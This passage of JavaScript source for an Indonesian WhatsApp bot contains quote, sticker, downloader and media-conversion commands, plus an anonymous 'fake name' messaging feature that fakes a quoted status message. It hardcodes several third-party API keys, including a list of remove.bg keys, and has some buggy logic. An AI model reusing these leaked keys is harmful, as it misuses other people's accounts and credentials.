          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "quotes":
        {
          var Quotes = JSON.parse(fs.readFileSync("./src/quotes/quotes.json"));
          var hasil = pickRandom(Quotes);
          let buttons = [
            {
              buttonId: `${command}`,
              buttonText: { displayText: "⬡ BACK" },
              type: 1,
            },
          ];
          let buttonMessage = {
            text: `${hasil}`,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + hasil,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "quotesjawa":
        {
          var jawa = JSON.parse(
            fs.readFileSync("./src/quotes/quotesjawa.json")
          );
          var hasil = pickRandom(jawa);
          let buttons = [
            {
              buttonId: `${command}`,
              buttonText: { displayText: "⬡ BACK" },
              type: 1,
            },
          ];
          let buttonMessage = {
            text: `${hasil}`,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + hasil,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "katagalau":
        {
          var Quotes = JSON.parse(
            fs.readFileSync("./src/quotes/katagalau.json")
          );
          var hasil = pickRandom(Quotes);
          let buttons = [
            {
              buttonId: `${command}`,
              buttonText: { displayText: "⬡ BACK" },
              type: 1,
            },
          ];
          let buttonMessage = {
            text: `${hasil}`,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + hasil,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "dilan":
        {
          var Dilan = JSON.parse(fs.readFileSync("./src/quotes/dilan.json"));
          var hasil = pickRandom(Dilan);
          let buttons = [
            {
              buttonId: `${command}`,
              buttonText: { displayText: "⬡ BACK" },
              type: 1,
            },
          ];
          let buttonMessage = {
            text: `${hasil}`,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + hasil,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "katabucin":
        {
          var teks = JSON.parse(fs.readFileSync("./src/quotes/katabucin.json"));
          var hasil = pickRandom(teks);
          let buttons = [
            {
              buttonId: `${command}`,
              buttonText: { displayText: "⬡ BACK" },
              type: 1,
            },
          ];
          let buttonMessage = {
            text: `${hasil}`,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + hasil,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "bucin":
        {
          var bucin = JSON.parse(fs.readFileSync("./src/quotes/bucin.json"));
          var hasil = pickRandom(bucin);
          let buttons = [
            {
              buttonId: `${command}`,
              buttonText: { displayText: "⬡ BACK" },
              type: 1,
            },
          ];
          let buttonMessage = {
            text: `${hasil}`,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + hasil,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "katailham":
        {
          var ilham = JSON.parse(
            fs.readFileSync("./src/quotes/katailham.json")
          );
          var hasil = pickRandom(ilham);
          let buttons = [
            {
              buttonId: `${command}`,
              buttonText: { displayText: "⬡ BACK" },
              type: 1,
            },
          ];
          let buttonMessage = {
            text: `${hasil}`,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + hasil,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
            headerType: 2,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "renungan":
        {
          var renungan = JSON.parse(
            fs.readFileSync("./src/quotes/renungan.json")
          );
          var hasil = pickRandom(renungan);
          let buttons = [
            {
              buttonId: `${command}`,
              buttonText: { displayText: "⬡ BACK" },
              type: 1,
            },
          ];
          let buttonMessage = {
            text: `${hasil}`,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + hasil,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
            headerType: 2,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "gombalan":
        {
          var gombalan = JSON.parse(
            fs.readFileSync("./src/quotes/gombalan.json")
          );
          var hasil = pickRandom(gombalan);
          let buttons = [
            {
              buttonId: `${command}`,
              buttonText: { displayText: "⬡ BACK" },
              type: 1,
            },
          ];
          let buttonMessage = {
            text: `${hasil}`,
            footer: botname,
            templateButtons: [
              {
                urlButton: {
                  displayText: `Salin Kata`,
                  url: "https://www.whatsapp.com/otp/copy/" + hasil,
                },
              },
              { quickReplyButton: { displayText: `⏭️ Next`, id: command } },
            ],
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "patrick":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/patrick?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "lonet":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/lonte?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "lidi":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/manusia-lidi?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "kucing":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kucing?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "sponbob":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/sponsbob?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "kawansponbob":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kawan-sponsbob?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "popoci":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/popoci?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "meow":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/meow?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "menjamet":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/menjamet?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "tyni":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/tyni?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "gojosatoru":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/gojosatoru?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "hopeboy":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/hope-boy?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "doge":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/doge?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "dinokuning":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/dyno-kuning?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "nicholas":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/nicholas?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "krrobot":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/kr-robot?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "jiisho":
        reply(mess.wait);
        SatganzDevs.sendMessage(
          m.chat,
          {
            sticker: {
              url: `https://api.zeeoneofc.xyz/api/telegram-sticker/jisoo?apikey=dhmDlD5x`,
            },
          },
          { quoted: m }
        );
        break;
      case "tiktok": {
        if (!q) reply("Urlnya?");
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(`Link invalid!!`);
        proses(from);
        let media = await fetchJson(`https://api.akuari.my.id/downloader/tiktok?link=${q}`)
        let buttons = [
          {
            buttonId: `tiktokaudio ${q}`,
            buttonText: { displayText: "♫ Audio" },
            type: 1,
          },
        ];
        
          SatganzDevs.sendMessage(
            from,
            {
              video: { url: media.respon.video },
              caption: `Nih Kak >///<`,
              footer: botname,
              buttons: buttons,
            },
            { quoted: m }
          );
          }
        break;
      case "tiktokmp3":
      case "tiktokaudio":
        if (!q) reply("Urlnya?");
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(`Link invalid!!`);
        proses(from);
        let media = await fetchJson(
          `https://api.akuari.my.id/downloader/tiktok3?link=${q}`
        );
        SatganzDevs.sendMessage(
          from,
          {
            audio: { url: media.hasil.download_mp3 },
            mimetype: "audio/mpeg",
            fileName: `@${media.hasil.video_title}.mp3`,
          },
          { quoted: m }
        );
        break;
      case "play":
      case "ytplay":
        {
          if (!text) throw `Example : ${prefix + command} story wa anime`;
          let yts = require("yt-search");
          proses(from);
          let search = await yts(text);
          let anu =
            search.videos[Math.floor(Math.random() * search.videos.length)];
          let buttons = [
            {
              buttonId: `ytmp3 ${anu.url}`,
              buttonText: { displayText: "♫ Audio" },
              type: 1,
            },
            {
              buttonId: `ytmp4 ${anu.url}`,
              buttonText: { displayText: "► Video" },
              type: 1,
            },
          ];
          let buttonMessage = {
            image: { url: anu.thumbnail },
            caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
            footer: botname,
            buttons: buttons,
            headerType: 4,
          };
          SatganzDevs.sendMessage(m.chat, buttonMessage, { quoted: m });
        }
        break;
      case "ytmp3":
      case "ytaudio":
        {
          if (!text)
            throw `Example : ${
              prefix + command
            } https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`;
          proses(from);
          let quality = args[1] ? args[1] : "128kbps";
          let media = await fetchJson(
            `https://api.akuari.my.id/downloader/youtube3?link=${q}&type=360`
          );
          console.log(media);
          SatganzDevs.sendMessage(
            m.chat,
            {
              audio: { url: media.audio.audio },
              mimetype: "audio/mpeg",
              fileName: `${media.title}.mp3`,
            },
            { quoted: m }
          );
        }
        break;
      case "ytmp4":
      case "ytvideo":
        {
          let { ytv } = require("./lib/y2mate");
          if (!text)
            throw `Example : ${
              prefix + command
            } https://youtube.com/watch?v=PtFMh6Tccag%27 360p`;
          proses(from);
          let quality = args[1] ? args[1] : "360p";
          let media = await ytv(text, quality);
          if (media.filesize >= 100000)
            return reply("File Melebihi Batas " + util.format(media));
          SatganzDevs.sendMessage(
            m.chat,
            {
              video: { url: media.dl_link },
              mimetype: "video/mp4",
              fileName: `${media.title}.mp4`,
              caption: `⭔ Title : ${media.title}\n⭔ File Size : ${
                media.filesizeF
              }\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${
                args[1] || "360p"
              }`,
            },
            { quoted: m }
          );
        }
        break;
      case "simi":
        {
          if (m.isGroup) throw `simi hanya bisa di private chat kak`;
          if (args[0] === "on") {
            if (db.data.chats[m.chat].simi)
              return reply(`Sudah Aktif Sebelumnya`);
            db.data.chats[m.chat].simi = true;
            reply(
              `Simi Aktif !\nSekarang Semua pesan yang kamu kirim akan di balas oleh bot`
            );
          } else if (args[0] === "off") {
            if (!db.data.chats[m.chat].simi)
              return reply(`Sudah Tidak Aktif Sebelumnya`);
            db.data.chats[m.chat].simi = false;
            reply(`Simi di matikan.`);
          } else {
            let buttons = [
              {
                buttonId: "simi on",
                buttonText: { displayText: "On" },
                type: 1,
              },
              {
                buttonId: "simi off",
                buttonText: { displayText: "Off" },
                type: 1,
              },
            ];
            await SatganzDevs.sendButtonText(
              m.chat,
              buttons,
              `Mode Auto Chat\nJika Mengaktifkan Mode ini, bot akan membalas semua pesan yang anda kirim\nTekan Tombol On/off untuk meng hidup/matikan autochat.`,
              SatganzDevs.user.name,
              m
            );
          }
        }
        break;
      case "autoai":
        {
          if (m.isGroup) throw `auto AI hanya bisa di private chat kak`;
          if (args[0] === "on") {
            if (global.db.data.settings[botNumber].autoai)
              return reply(`Sudah Aktif Sebelumnya`);
            global.db.data.settings[botNumber].autoai = true;
            reply(
              `Auto AI Aktif !\nSekarang Semua pesan yang kamu kirim akan di balas oleh bot`
            );
          } else if (args[0] === "off") {
            if (!global.db.data.settings[botNumber].autoai)
              return reply(`Sudah Tidak Aktif Sebelumnya`);
            global.db.data.settings[botNumber].autoai = false;
            reply(`Auto AI di matikan.`);
          } else {
            let buttons = [
              {
                buttonId: "autoai on",
                buttonText: { displayText: "On" },
                type: 1,
              },
              {
                buttonId: "autoai off",
                buttonText: { displayText: "Off" },
                type: 1,
              },
            ];
            await SatganzDevs.sendButtonText(
              m.chat,
              buttons,
              `Mode Auto Chat\nJika Mengaktifkan Mode ini, bot akan membalas semua pesan yang anda kirim\nTekan Tombol On/off untuk meng hidup/matikan autochat.`,
              SatganzDevs.user.name,
              m
            );
          }
        }
        break;
      case "activity":
        {
          if (!isCreator) throw mess.owner;
          if (args[0] === "on") {
            if (global.db.data.settings[botNumber].activity)
              return reply(`Sudah Aktif Sebelumnya`);
            global.db.data.settings[botNumber].activity = true;
            reply(`berhasil menyalakan info aktifitas pengguna`);
          } else if (args[0] === "off") {
            if (!global.db.data.settings[botNumber].activity)
              return reply(`Sudah Tidak Aktif Sebelumnya`);
            global.db.data.settings[botNumber].activity = false;
            reply(`Infochat di matikan.`);
          } else {
            let buttons = [
              {
                buttonId: "activity on",
                buttonText: { displayText: "On" },
                type: 1,
              },
              {
                buttonId: "activity off",
                buttonText: { displayText: "Off" },
                type: 1,
              },
            ];
            await SatganzDevs.sendButtonText(
              m.chat,
              buttons,
              `Mode Auto Chat Owner \nJika Ada Yang Mengechat Bot\nTekan Tombol On/off untuk meng hidup/matikan autochat.`,
              SatganzDevs.user.name,
              m
            );
          }
        }
        break;
      case "sticker":
      case "s":
      case "stickergif":
      case "sgif":
        {
          if (!quoted)
            return reply(`*Balas Video/Image Dengan Caption* ${prefix + command}`)

          if (/image/.test(mime)) {
            let media = await quoted.download();
            let encmedia = await SatganzDevs.sendImageAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
            await fs.unlinkSync(encmedia);
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11)
              return reply("*Maksimal 10 detik!*");
            let media = await quoted.download();
            let encmedia = await SatganzDevs.sendVideoAsSticker(
              m.chat,
              media,
              m,
              { packname: global.packname, author: global.author }
            );
            await fs.unlinkSync(encmedia);
          } else {
            return reply(`*Kirim Gambar/Video Dengan Caption* ${
              prefix + command
            }\nDurasi *Video 1-9 Detik*`)
          }
        }
        break;
      case "stikerwm":
      case "stickerwm":
      case "swm":
      case "stickergifwm":
      case "sgifwm":
      case "take":
      case "wm":
        {
          let [teks1, teks2] = text.split`|`;
          if (!teks1)
            reply(`Kirim/reply image/video dengan caption ${
              prefix + command
            } teks1|teks2`)
          if (!teks2)
            reply(`Kirim/reply image/video dengan caption ${
              prefix + command
            } teks1|teks2`)

          if (/image/.test(mime)) {
            let media = await SatganzDevs.downloadMediaMessage(qmsg);
            let encmedia = await SatganzDevs.sendImageAsSticker(
              m.chat,
              media,
              m,
              { packname: teks1, author: teks2 }
            );
            await fs.unlinkSync(encmedia);
          } else if (/video/.test(mime)) {
            if ((quoted.msg || quoted).seconds > 11)
              return reply("Maksimal 10 detik!");
            let media = await SatganzDevs.downloadMediaMessage(qmsg);
            let encmedia = await SatganzDevs.sendVideoAsSticker(
              m.chat,
              media,
              m,
              { packname: teks1, author: teks2 }
            );
            await fs.unlinkSync(encmedia);
          } else {
            throw `Kirim Gambar/Video Dengan Caption ${
              prefix + command
            }\nDurasi Video 1-9 Detik`;
          }
        }
        break;
      case "attp":
      case "ttp":
        {
          if (!text) return reply(`Example : ${prefix + command} text`)
          await SatganzDevs.sendMedia(
            m.chat,
            `https://xteam.xyz/${command}?file&text=${text}`,
            "SatganzDevs",
            "dev",
            m,
            { asSticker: true }
          );
        }
        break;
      case "tts":
        {
          if (!text) return reply(`Example : ${prefix + command} text`)
          reply(mess.proses);
          let tts = await fetchJson(
            `https://api.akuari.my.id/texttovoice/texttosound_id?query=${text}`
          );
          SatganzDevs.sendMessage(
            m.chat,
            {
              audio: { url: tts.result },
              mimetype: "audio/mpeg",
              fileName: `${text}.mp3`,
            },
            { quoted: m }
          );
        }
        break;
      case "smim":
      case "smeme":
      case "stickmeme":
      case "stikmeme":
      case "stickermeme":
      case "stikermeme":
        {
          try {
            let respond = `Kirim/reply image/sticker dengan caption ${
              prefix + command
            } text1|text2`;
            if (!/image/.test(mime)) throw respond;
            if (!text) throw respond;

            atas = text.split("|")[0] ? text.split("|")[0] : "-";
            bawah = text.split("|")[1] ? text.split("|")[1] : "-";
            let { TelegraPh } = require("./lib/uploader");
            let mee = await SatganzDevs.downloadAndSaveMediaMessage(qmsg);
            let mem = await TelegraPh(mee);
            let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(
              atas
            )}/${encodeURIComponent(bawah)}.png?background=${mem}`;
            let awikwok = await SatganzDevs.sendImageAsSticker(
              m.chat,
              smeme,
              m,
              { packname: global.packname, author: global.author }
            );
            await fs.unlinkSync(awikwok);
          } catch (e) {
            reply(`Error\nHarus Pakai Gambar!`);
          }
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!quoted) throw "Reply Image";
          if (!/webp/.test(mime))
            throw `Balas sticker dengan caption *${prefix + command}*`;

          let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted);
          let ran = await getRandom(".png");
          exec(`ffmpeg -i ${media} ${ran}`, (err) => {
            fs.unlinkSync(media);
            if (err) throw err;
            let buffer = fs.readFileSync(ran);
            SatganzDevs.sendMessage(m.chat, { image: buffer }, { quoted: m });
            fs.unlinkSync(ran);
          });
        }
        break;
      case "tomp4":
      case "tovideo":
        {
          if (!quoted) throw "Reply Image";
          if (!/webp/.test(mime))
            throw `balas stiker dengan caption *${prefix + command}*`;

          let { webp2mp4File } = require("./lib/uploader");
          let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted);
          let webpToMp4 = await webp2mp4File(media);
          await SatganzDevs.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
            },
            { quoted: m }
          );
          await fs.unlinkSync(media);
        }
        break;
      case "toaud":
      case "toaudio":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${
              prefix + command
            }`;
          if (!quoted)
            throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${
              prefix + command
            }`;

          let media = await quoted.download();
          let { toAudio } = require("./lib/converter");
          let audio = await toAudio(media, "mp4");
          SatganzDevs.sendMessage(
            m.chat,
            { audio: audio, mimetype: "audio/mpeg" },
            { quoted: m }
          );
        }
        break;
      case "tomp3":
        {
          if (/document/.test(mime))
            throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${
              prefix + command
            }`;
          if (!/video/.test(mime) && !/audio/.test(mime))
            throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${
              prefix + command
            }`;
          if (!quoted)
            throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${
              prefix + command
            }`;

          let media = await quoted.download();
          let { toAudio } = require("./lib/converter");
          let audio = await toAudio(media, "mp4");
          SatganzDevs.sendMessage(
            m.chat,
            {
              document: audio,
              mimetype: "audio/mpeg",
              fileName: `Convert By ${botname}.mp3`,
            },
            { quoted: m }
          );
        }
        break;
      case "tovn":
      case "toptt":
        {
          if (!/video/.test(mime) && !/audio/.test(mime))
            throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${
              prefix + command
            }`;
          if (!quoted)
            throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${
              prefix + command
            }`;

          let media = await quoted.download();
          let { toPTT } = require("./lib/converter");
          let audio = await toPTT(media, "mp4");
          SatganzDevs.sendMessage(
            m.chat,
            { audio: audio, mimetype: "audio/mpeg", ptt: true },
            { quoted: m }
          );
        }
        break;
      case "togif":
        {
          if (!quoted) throw "Reply Image";
          if (!/webp/.test(mime))
            throw `balas stiker dengan caption *${prefix + command}*`;

          let { webp2mp4File } = require("./lib/uploader");
          let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted);
          let webpToMp4 = await webp2mp4File(media);
          await SatganzDevs.sendMessage(
            m.chat,
            {
              video: {
                url: webpToMp4.result,
                caption: "Convert Webp To Video",
              },
              gifPlayback: true,
            },
            { quoted: m }
          );
          await fs.unlinkSync(media);
        }
        break;
      case "tourl":
        {
          let {
            UploadFileUgu,
            webp2mp4File,
            TelegraPh,
          } = require("./lib/uploader");
          let media = await SatganzDevs.downloadAndSaveMediaMessage(quoted);
          if (/image/.test(mime)) {
            proses(from);
            let anu = await TelegraPh(media);
            reply(`SUCCESS\nCREATOR : SATGANZDEVS\n ${util.format(anu)}`);
          } else if (!/image/.test(mime)) {
            proses(from);
            let anu = await UploadFileUgu(media);
            reply(`SUCCESS\nCREATOR : SATGANZDEVS\n ${util.format(anu)}`);
          }
          await fs.unlinkSync(media);
        }
        break;
      case "toqr":
      case "qr":
        {
          proses(from);
          if (!text) throw "No Query Text";

          SatganzDevs.sendMessage(
            m.chat,
            {
              image: {
                url: `https://api.qrserver.com/v1/create-qr-code/?size=1000x1000&data=${text}`,
              },
              caption: `Nih Bro`,
            },
            { quoted: m }
          );
        }
        break;
      case "imagenobg":
      case "removebg":
      case "remove-bg":
        {
          if (!quoted)
            throw `Kirim/Reply Image Dengan Caption ${prefix + command}`;
          if (!/image/.test(mime))
            throw `Kirim/Reply Image Dengan Caption ${prefix + command}`;
          if (/webp/.test(mime))
            throw `Kirim/Reply Image Dengan Caption ${prefix + command}`;
          let remobg = require("remove.bg");
          let apirnobg = [
            "q61faXzzR5zNU6cvcrwtUkRU",
            "S258diZhcuFJooAtHTaPEn4T",
            "5LjfCVAp4vVNYiTjq9mXJWHF",
            "aT7ibfUsGSwFyjaPZ9eoJc61",
            "BY63t7Vx2tS68YZFY6AJ4HHF",
            "5Gdq1sSWSeyZzPMHqz7ENfi8",
            "86h6d6u4AXrst4BVMD9dzdGZ",
            "xp8pSDavAgfE5XScqXo9UKHF",
            "dWbCoCb3TacCP93imNEcPxcL",
          ];
          let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)];
          hmm = (await "./src/remobg-") + getRandom("");
          localFile = await SatganzDevs.downloadAndSaveMediaMessage(
            quoted,
            hmm
          );
          outputFile = (await "./src/hremo-") + getRandom(".png");

          remobg
            .removeBackgroundFromImageFile({
              path: localFile,
              apiKey: apinobg,
              size: "regular",
              type: "auto",
              scale: "100%",
              outputFile,
            })
            .then(async (result) => {
              SatganzDevs.sendMessage(
                m.chat,
                { image: fs.readFileSync(outputFile), caption: mess.success },
                { quoted: m }
              );
              await fs.unlinkSync(localFile);
              await fs.unlinkSync(outputFile);
            });
        }
        break;
      case "menfes":
      case "menfess":
        if (m.isGroup) throw "fitur tidak dapat digunakan di grup";
        if (!text) return reply(`Example : ${prefix + command} 6282xxxxx|Nama Palsu`);
        var anoname = q.split("|")[1]
        this.menfess = this.menfess ? this.menfess : {};
        let kafloc = {
          key: {
            participant: "0@s.whatsapp.net",
            ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
          },
          message: {
            locationMessage: {
              name: ucapanWaktu + "" + anoname + " ♥️",
              jpegThumbnail: thumb,
            },
          },
        };
        let no =
          q.split("|")[1].replace(/[^0-9]/g, "").replace(/[^0-9]/g, "") +
          "@s.whatsapp.net";
        let tagsv = no
          .replace(/[@s.whatsapnet]/g, "")
          .replace(/[@S.WHATSAPNET]/g, "");
        var cekon = await SatganzDevs.onWhatsApp(no);
        if (no == m.sender) return reply("its your self bitch!");
        if (cekon.length == 0)
          return reply(
            `Nomor tersebut tidak terdaftar di whatsapp\n\nMasukkan nomer yang valid/terdaftar di WhatsApp`
          );
        let id = +new Date();
        this.menfess[id] = {
          id,
          a: m.sender,
          b: no,
          state: "WAITING",
          check: function (who = "") {
            return [this.a, this.b].includes(who);
          },
          other: function (who = "") {
            return who === this.a ? this.b : who === this.b ? this.a : "";
          },
        };
        let name2 = await SatganzDevs.getName(no);
        let pjtxt = `Halo ${name2}\n${anoname}\nMengajak Mu\n\nBermain Anonymous Chat!`;
        await SatganzDevs.sendButtonText(
          no,
          [
            {
              buttonId: "confirm",
              buttonText: { displayText: "Sambungkan" },
              type: 1,
            },
          ],
          pjtxt,
          "PESAN RAHASIA",
          m,
          { quoted: kafloc }
        );
        let akhji = `Menunggu Konfirmasi Dari\n ${
          tagsv.split("@")[0]
        }\nStatus: Waiting`;
        await SatganzDevs.sendButtonText(
          m.chat,
          [
            {
              buttonId: "hehehe",
              buttonText: { displayText: "BAIKLAH ♥️" },
              type: 1,
            },
          ],
          akhji,
          "PESAN RAHASIA",
          m,
          { quoted: kafloc }
        );
        break;
      case "delmenfess":
      case "dm": {
        if (m.isGroup) return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
        this.menfess = this.menfess ? this.menfess : {};
        let room = Object.values(this.menfess).find((room) =>
          room.check(m.sender)
        );
        if (!room) {
          let buty = [
            {
              buttonId: "menfess",
              buttonText: { displayText: "Start Menfess" },
              type: 1,
            },
          ];
          await SatganzDevs.sendButtonText(
            m.chat,
            buty,
            `\`\`\`Kamu Sedang Tidak Berada Di Sesi Menfess, Tekan Button Untuk Mengetahui Cara Menggunakan Fitur Menfess\`\`\``,
            {
              quoted: {
                key: {
                  participant: "0@s.whatsapp.net",
                  ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
                },
                message: {
                  locationMessage: {
                    name: ucapanWaktu + "" + pushname + " ♥️",
                    jpegThumbnail: thumb,
                  },
                },
              },
            }
          );
          throw false;
        } else if (room) {
          reply(`\`\`\`Kamu Telah Meninggalkan Sesi Menfess\`\`\``);
          let other = room.other(m.sender);
          if (other)
            await SatganzDevs.sendText(
              other,
              `\`\`\`Partner Telah Meninggalkan Sesi Menfess\`\`\``,
              m
            );
          delete this.menfess[room.id];
        }
        if (command === "leave") break;
      }
      case "confirm":
        {
          if (m.isGroup)
            return reply("Fitur Tidak Dapat Digunakan Untuk Group!");
          let kamlong = {
            key: {
              participant: "0@s.whatsapp.net",
              ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
            },
            message: {
              locationMessage: {
                name: ucapanWaktu + "" + pushname + " ♥️",
                jpegThumbnail: thumb,
              },
            },
          };
          this.menfess = this.menfess ? this.menfess : {};
          let room = Object.values(this.menfess).find(
            (room) => room.state === "WAITING"
          );
          if (room) {
            await SatganzDevs.sendButtonText(
              room.a,
              [
                {
                  buttonId: "hehehe",
                  buttonText: { displayText: "OKE" },
                  type: 1,
                },
              ],
              `\`\`\`Menfess Berhasil Tersambung\`\`\``,
              botname,
              m
            );
            room.state = "CHATTING";
            await SatganzDevs.sendButtonText(
              m.chat,
              [
                {
                  buttonId: "hehehe",
                  buttonText: { displayText: "OKE" },
                  type: 1,
                },
              ],
              `\`\`\`Menfess Berhasil Tersambung\`\`\``,
              botname,
              m
